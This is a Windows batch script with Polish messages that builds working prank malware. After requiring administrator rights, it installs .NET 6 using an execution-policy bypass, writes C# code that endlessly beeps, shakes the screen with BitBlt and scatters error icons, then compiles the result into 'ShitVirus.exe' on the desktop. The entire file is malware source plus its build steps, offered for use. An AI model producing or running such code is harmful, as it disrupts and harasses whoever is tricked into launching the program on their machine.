@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] BLAD: Musisz kliknac PRAWYM i wybrac "Uruchom jako administrator".
    pause
    exit
)

title LOL-MAIN BUILDER FIX
color 0E

:: Ustawienie folderu
set "targetDir=%userprofile%\Desktop\lol-main"
if not exist "%targetDir%" mkdir "%targetDir%"
cd /d "%targetDir%"

echo [*] Etap 1: Sprawdzanie srodowiska...
dotnet --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Brak .NET. Pobieranie instalatora...
    powershell -Command "Invoke-WebRequest -Uri 'https://dot.net/v1/dotnet-install.ps1' -OutFile 'dotnet-install.ps1'"
    powershell -ExecutionPolicy Bypass -File "dotnet-install.ps1" -Channel 6.0 -InstallDir "%targetDir%\dotnet"
    :: Dodajemy do PATH na sztywno dla tej sesji
    set "PATH=%PATH%;%targetDir%\dotnet"
)
echo [+] .NET GOTOWY.

echo [*] Etap 2: Czyszczenie i tworzenie projektu...
:: Usuwamy stare pliki, jesli istnieja, zeby nie bylo konfliktow
if exist "Virus.csproj" del /f /q "Virus.csproj"
if exist "Program.cs" del /f /q "Program.cs"

:: Tworzymy nowy projekt bez zbednych komunikatow
dotnet new winforms --force --name "Virus" >nul
echo [+] PROJEKT UTWORZONY.

echo [*] Etap 3: Wstrzykiwanie kodu...
(
echo using System;
echo using System.Drawing;
echo using System.Runtime.InteropServices;
echo using System.Threading;
echo using System.Windows.Forms;
echo.
echo class Hybrid {
echo     [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h^);
echo     [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hD, int x, int y, int w, int h, IntPtr hS, int sx, int sy, uint op^);
echo     [DllImport("user32.dll")] static extern int GetSystemMetrics(int n^);
echo.
echo     [STAThread]
echo     static void Main(^) {
echo         new Thread((^) =^> { while(true) { Console.Beep(new Random(^).Next(400, 900^), 100^); Thread.Sleep(300^); } }).Start(^);
echo         IntPtr hdc = GetDC(IntPtr.Zero^);
echo         int w = GetSystemMetrics(0^), h = GetSystemMetrics(1^);
echo         Random r = new Random(^);
echo         while(true) {
echo             BitBlt(hdc, r.Next(-8, 9^), r.Next(-8, 9^), w, h, hdc, 0, 0, 0x00CC0020^);
echo             if(r.Next(10^) ^> 7^) Graphics.FromHdc(hdc^).DrawIcon(SystemIcons.Error, r.Next(w^), r.Next(h^)^);
echo             Thread.Sleep(10^);
echo         }
echo     }
echo }
) > Program.cs
echo [+] KOD WSTRZYKNIETY.

echo [*] Etap 4: Kompilacja (to moze potrwac)...
dotnet build -c Release
if %errorLevel% neq 0 (
    echo [!] BLAD KOMPILACJI! Sprawdz powyzsze bledy.
    pause
    exit
)

echo [*] Etap 5: Finalizacja...
:: Szukamy pliku exe i kopiujemy na Desktop/lol-main
copy /y "bin\Release\net6.0-windows\Virus.exe" "ShitVirus.exe"
echo.
echo ===================================================
echo   SUKCES! Plik ShitVirus.exe jest w folderze lol-main.
echo ===================================================
pause
